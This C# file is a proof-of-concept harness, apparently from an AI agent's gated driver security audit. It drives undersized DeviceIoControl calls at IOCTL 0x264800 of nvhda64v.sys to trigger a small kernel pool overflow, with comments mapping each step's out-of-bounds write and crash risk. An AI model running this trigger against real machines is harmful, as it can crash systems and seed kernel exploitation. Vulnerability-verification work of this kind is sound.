// t6_phaseB.cs - PHASE B STAGE ONLY - NEVER EXECUTED BY AGENT t6 (orchestrator-gated)
//
// Overflow ladder for nvhda64v.sys IOCTL 0x264800 (static audit nvhda64v.md):
//   FUN_140012010 writes *(int*)SystemBuffer = channelConfig (4 B) and
//   *(uint16*)(SystemBuffer+4) = channels (2 B) -> 6 bytes, with NO OutputBufferLength gate.
//   METHOD_BUFFERED allocation = max(InputBufferLength, OutputBufferLength).
//   => an overflow of (6 - max(in,out)) bytes occurs iff BOTH in<=5 AND out<=5.
//   In-bounds acceptance (Phase A) used in=12/out=32 (allocation 32 B) - safe.
//
// STEPS (each = ONE separate vmrun runProgramInGuest invocation + immediate evidence pull):
//   gate   - B0: verify openable (RW, admin) + restricted-token open works; abort otherwise
//   s5     - in=5  out=5  -> allocation 5 B -> 1-byte OOB (byte 5 of the word@4)
//   s4     - in=4  out=4  -> allocation 4 B -> 2-byte OOB (word@4 fully OOB)
//   s3     - in=3  out=3  -> allocation 3 B -> 3-byte OOB (last byte of dword + word@4)
//   s2     - in=2  out=2  -> allocation 2 B -> 4-byte OOB (upper 2 bytes of dword + word@4)
//   s1     - in=1  out=1  -> allocation 1 B -> 5-byte OOB
//   s0     - in=0  out=0  -> allocation 0 B (SystemBuffer may be NULL) -> full 6-byte write
//                    at NULL/zero-size allocation - HIGHEST risk of immediate bugcheck.
//
// ESCALATION HONESTY NOTE (pre-computed, for the report):
//   Overflow extent is at most 6 bytes past a <=5-byte non-paged pool allocation, with
//   values = channelConfig dword (max value 0x63F -> bytes 3F 06 00 00) + channels word
//   (02..08). A 5-byte request occupies a >=8/16-byte pool chunk, so bytes 5 of the write
//   land in the chunk's own slack or the adjacent pool block-header. Adjacent-pool
//   corruption is POSSIBLE but tiny and semi-fixed-value; the practical exploit value of
//   this primitive is limited - even if confirmed the static WRITE-MEDIUM verdict may
//   stand (as the task brief itself notes).
//
// usage: t6_phaseB.exe <logfile> <step> <devicepath>
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class T6PhaseB
{
    static string Log;

    static void L(string s)
    {
        Console.WriteLine(s);
        try { if (Log != null) File.AppendAllText(Log, s + "\r\n"); } catch { }
    }

    static int Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("usage: t6_phaseB.exe <logfile> <step> <devicepath>"); return 2; }
        Log = args[0];
        try { return Dispatch(args[1], args.Length > 2 ? args[2] : null); }
        catch (Exception e) { L("FATAL " + e.GetType().Name + ": " + e.Message); return 99; }
    }

    static int Dispatch(string step, string path)
    {
        if (step == "gate") return Gate(path);
        switch (step)
        {
            case "s5": return Step(path, 5);
            case "s4": return Step(path, 4);
            case "s3": return Step(path, 3);
            case "s2": return Step(path, 2);
            case "s1": return Step(path, 1);
            case "s0": return Step(path, 0);
            default: L("unknown step " + step); return 2;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint desiredAccess, uint shareMode, IntPtr secAttr, uint creationDisposition, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, byte[] inBuf, uint inLen, byte[] outBuf, uint outLen, out uint bytesReturned, IntPtr overlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint FormatMessageW(uint flags, IntPtr source, uint msgId, uint langId, StringBuilder buf, uint size, IntPtr args);

    static IntPtr INVALID = (IntPtr)(-1);

    static string ErrText(int err)
    {
        try
        {
            StringBuilder sb = new StringBuilder(1024);
            if (FormatMessageW(0x1000, IntPtr.Zero, (uint)err, 0, sb, 1024, IntPtr.Zero) != 0)
                return sb.ToString().Trim().TrimEnd('\0', '\r', '\n');
        }
        catch { }
        return "";
    }

    static int Gate(string path)
    {
        L("--- B0 GATE: openability check (admin) ---");
        IntPtr h = CreateFileW(path, 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        int err = Marshal.GetLastWin32Error();
        if (h == INVALID) { L(String.Format("  admin RW open FAIL lastErr={0} ({1}) -> B0 GATE FAILED", err, ErrText(err))); return 1; }
        L(String.Format("  admin RW open OK handle=0x{0:X}", h.ToInt64()));
        CloseHandle(h);
        L("  B0 GATE PASSED (admin open works; restricted-token check is run by the .ps1 wrapper before any step)");
        return 0;
    }

    static int Step(string path, int len)
    {
        L(String.Format("--- PHASE B step: in={0} out={0} -> allocation {0} B -> {1}-byte OOB ---", len, 6 - len));
        L("  This is an OVERFLOW-SIZED call (max(in,out) < 6). It is being executed ONLY as an");
        L("  orchestrator-authorized PHASE B step; agent t6 never executed it in Phase A.");
        IntPtr h = CreateFileW(path, 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        int err = Marshal.GetLastWin32Error();
        if (h == INVALID)
        {
            L(String.Format("  open FAIL lastErr={0} ({1}) -> step ABORTED, no call made", err, ErrText(err)));
            return 1;
        }
        L(String.Format("  open OK handle=0x{0:X}", h.ToInt64()));
        byte[] inp = new byte[len];
        byte[] outB = new byte[len];
        for (int i = 0; i < len; i++) outB[i] = 0xEE;
        uint ret = 0;
        bool ok = DeviceIoControl(h, 0x264800, inp, (uint)len, outB, (uint)len, out ret, IntPtr.Zero);
        err = Marshal.GetLastWin32Error();
        L(String.Format("  DeviceIoControl(0x264800, in={0}B, out={0}B) -> ok={1} lastErr={2} ({3}) bytesReturned={4}", len, ok, err, ErrText(err), ret));
        if (len > 0)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < len; i++) sb.AppendFormat("{0:x2} ", outB[i]);
            L("  returned buffer: " + sb.ToString().TrimEnd());
        }
        CloseHandle(h);
        L("  step done; handle closed");
        return 0;
    }
}
